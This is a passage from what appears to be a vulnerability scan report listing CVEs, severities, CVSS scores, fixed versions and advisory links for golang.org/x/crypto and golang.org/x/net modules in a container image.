│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [23]: https://access.redhat.com/security/cve/CVE-2026-46595 
│     │      │                  ├ [24]: https://bugzilla.redhat.com/show_bug.cgi?id=2480689 
│     │      │                  ├ [25]: https://github.com/golang/crypto/commit/533fb3f7e4a5ae23f69d1837cd851d3
│     │      │                  │       5ff5b76ce 
│     │      │                  ├ [26]: https://go.dev/cl/781642 
│     │      │                  ├ [27]: https://go.dev/issue/79570 
│     │      │                  ├ [28]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-46595 
│     │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-5023 
│     │      │                  ├ [31]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-46595
│     │      │                  │       .json 
│     │      │                  ├ [32]: https://ubuntu.com/security/notices/USN-8447-1 
│     │      │                  ├ [33]: https://ubuntu.com/security/notices/USN-8447-3 
│     │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-46595 
│     │      ├ PublishedDate   : 2026-05-22T04:16:25.55Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:18:13.947Z 
│     ├ [19] ╭ VulnerabilityID : CVE-2026-46597 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5013 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46597 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:c404802dbd57eda837a3ffcc4daa9187f9dbe8973779852aaa99da21849d5db4 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of Service via
│     │      │                   crafted AES-GCM packet decoder inputs 
│     │      ├ Description     : An incorrectly placed cast from bytes to int allowed for server-side panic in
│     │      │                   the AES-GCM packet decoder for well-crafted inputs. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-704 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-46597 
│     │      │                  ├ [1]: https://go.dev/cl/781620 
│     │      │                  ├ [2]: https://go.dev/issue/79561 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-46597 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5013 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-46597 
│     │      ├ PublishedDate   : 2026-05-22T04:16:26.003Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [20] ╭ VulnerabilityID : CVE-2026-39827 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5016 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39827 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:358d23f5f147ae55e99e572805610bfd3da6f31b57724dc1f346e6b9aa494e88 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang: golang.org/x/crypto/ssh: Denial of Service
│     │      │                   via repeated rejected channel openings 
│     │      ├ Description     : An authenticated SSH client that repeatedly opened channels which were
│     │      │                   rejected by the server caused unbounded memory growth, eventually crashing the
│     │      │                    server process and affecting all connected users. Rejected channels are now
│     │      │                   properly removed from the connection's internal state and released for garbage
│     │      │                    collection. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-924 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-39827 
│     │      │                  ├ [1]: https://go.dev/cl/781320 
│     │      │                  ├ [2]: https://go.dev/issue/35127 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-39827 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5016 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-39827 
│     │      ├ PublishedDate   : 2026-05-22T04:16:21.497Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [21] ╭ VulnerabilityID : CVE-2026-39833 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5005 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39833 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:44d8ce04a252b8fd25d01ba398a1ccc7e179b0775101ea9dddee81958c9546be 
│     │      ├ Title           : golang.org/x/crypto/ssh/agent: golang.org/x/crypto/ssh/agent: Security bypass
│     │      │                   due to unenforced key confirmation 
│     │      ├ Description     : The in-memory keyring returned by NewKeyring() silently accepted keys with the
│     │      │                    ConfirmBeforeUse constraint but never enforced it. The key would sign without
│     │      │                    any confirmation prompt, with no indication to the caller that the constraint
│     │      │                    was not in effect. NewKeyring() now returns an error when unsupported
│     │      │                   constraints are requested. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-862 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 3 
│     │      │                  ├ redhat: 2 
│     │      │                  ╰ ubuntu: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
│     │      │                           ╰ V3Score : 5.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2026-39833 
│     │      │                  ├ [1] : https://github.com/golang/crypto/commit/0fb843a472225645e917c84f1f97447
│     │      │                  │       57f0bab14 
│     │      │                  ├ [2] : https://go.dev/cl/778640 
│     │      │                  ├ [3] : https://go.dev/cl/778641 
│     │      │                  ├ [4] : https://go.dev/issue/79436 
│     │      │                  ├ [5] : https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [6] : https://nvd.nist.gov/vuln/detail/CVE-2026-39833 
│     │      │                  ├ [7] : https://pkg.go.dev/vuln/GO-2026-5005 
│     │      │                  ├ [8] : https://ubuntu.com/security/notices/USN-8447-1 
│     │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-8447-2 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-39833 
│     │      ├ PublishedDate   : 2026-05-22T04:16:22.773Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [22] ╭ VulnerabilityID : CVE-2026-39834 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5020 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39834 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:2b0d32dadfd7992876e5cee49eba94e130bcc655857bf9f834083ff4c9391af1 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang: golang.org/x/crypto/ssh: Denial of Service
│     │      │                   due to integer overflow in SSH channel write 
│     │      ├ Description     : When writing data larger than 4GB in a single Write call on an SSH channel, an
│     │      │                    integer overflow in the internal payload size calculation caused the write
│     │      │                   loop to spin indefinitely, sending empty packets without making progress. The
│     │      │                   size comparison now uses int64 to prevent truncation. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-190 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 3 
│     │      │                  ├ redhat: 2 
│     │      │                  ╰ ubuntu: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2026-39834 
│     │      │                  ├ [1] : https://github.com/golang/crypto/commit/e052873987615dc96fe67607a9a6adb
│     │      │                  │       76311344f 
│     │      │                  ├ [2] : https://go.dev/cl/781663 
│     │      │                  ├ [3] : https://go.dev/issue/79567 
│     │      │                  ├ [4] : https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [5] : https://nvd.nist.gov/vuln/detail/CVE-2026-39834 
│     │      │                  ├ [6] : https://pkg.go.dev/vuln/GO-2026-5020 
│     │      │                  ├ [7] : https://ubuntu.com/security/notices/USN-8447-1 
│     │      │                  ├ [8] : https://ubuntu.com/security/notices/USN-8447-2 
│     │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-8447-3 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-39834 
│     │      ├ PublishedDate   : 2026-05-22T04:16:24.237Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [23] ╭ VulnerabilityID : CVE-2026-46598 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5033 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46598 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:26e27dc1f5f93f0e83fdf3170f19e26d6094aee811d4c58494a7697ae60f39b3 
│     │      ├ Title           : golang.org/x/crypto/ssh/agent: golang: golang.org/x/crypto/ssh/agent: Denial
│     │      │                   of Service via malformed input 
│     │      ├ Description     : For certain crafted inputs, a 'ed25519.PrivateKey' was created by casting
│     │      │                   malformed wire bytes, leading to a panic when used. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-129 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                           ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-46598 
│     │      │                  ├ [1]: https://go.dev/cl/781360 
│     │      │                  ├ [2]: https://go.dev/issue/79596 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-46598 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5033 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-46598 
│     │      ├ PublishedDate   : 2026-05-22T04:16:26.537Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [24] ╭ VulnerabilityID : GO-2026-5932 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:de8210389166b1ade68c46018a26748d027fbc532c72a5ab38c6cb48820856e4 
│     │      ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
│     │      │                    has known security issues 
│     │      ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous
│     │      │                   known security issues, is not maintained, and should not be used.
│     │      │                   
│     │      │                   If you are required to interoperate with OpenPGP systems and need a maintained
│     │      │                    package, consider github.com/ProtonMail/go-crypto/openpgp which is a
│     │      │                   maintained fork that aims to be a drop-in replacement for this package. 
│     │      ├ Severity        : UNKNOWN 
│     │      ╰ References       ╭ [0]: https://go.dev/issue/44226 
│     │                         ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│     ├ [25] ╭ VulnerabilityID : CVE-2026-25681 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5029 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:0b86bb69908f733766d0428fee9bd35ea4173e512822bf9ac37188e38097978e 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code execution via
│     │      │                   Cross-Site Scripting 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.1 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
│     │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
│     │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
│     │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
│     │      │                  ├ [27]: https://go.dev/cl/781703 
│     │      │                  ├ [28]: https://go.dev/issue/79574 
│     │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-25681.html 
│     │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
│     │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5029 
│     │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
│     │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [26] ╭ VulnerabilityID : CVE-2026-27136 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5030 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:ac8268949b5c39b7ce596e3686748970d5bf2d4d7e2616f64c3208a5fd01cc94 
│     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
│     │      │                    HTML parsing bypass 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.1 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-27136 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
│     │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
│     │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
│     │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
│     │      │                  ├ [27]: https://go.dev/cl/781685 
│     │      │                  ├ [28]: https://go.dev/issue/79575 
│     │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-27136.html 
│     │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-27136 
│     │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5030 
│     │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-27136 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.087Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [27] ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.53.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:a120ef938665f8917093c04cb3e6c8d4005255fec20e7e9ae602de3372d3a756 
│     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
│     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-835 
│     │      │                  ╰ [1]: CWE-606 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
